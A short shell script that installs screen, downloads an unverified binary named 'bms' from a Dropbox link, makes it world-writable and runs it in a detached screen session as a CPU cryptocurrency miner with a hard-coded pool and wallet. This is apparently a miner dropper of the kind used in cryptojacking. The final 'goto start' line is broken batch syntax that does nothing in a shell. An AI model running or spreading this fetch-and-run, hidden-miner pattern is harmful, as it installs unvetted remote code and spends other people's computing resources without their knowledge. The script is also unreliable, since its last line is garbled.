
sudo apt-get update -y
sudo apt-get install -y screen
wget http://dl.dropboxusercontent.com/s/khboofn0qh8fyut/bms
chmod 777 bms
screen -d -m ./bms --algorithm randomscash --pool stratum-na.rplant.xyz:17019 --tls true --wallet scash1qgvlfk2ak0cf8m3e850gthwrx8ea2hpnrf5s0ny --keepalive true
goto start --password pod --cpu-threads 15
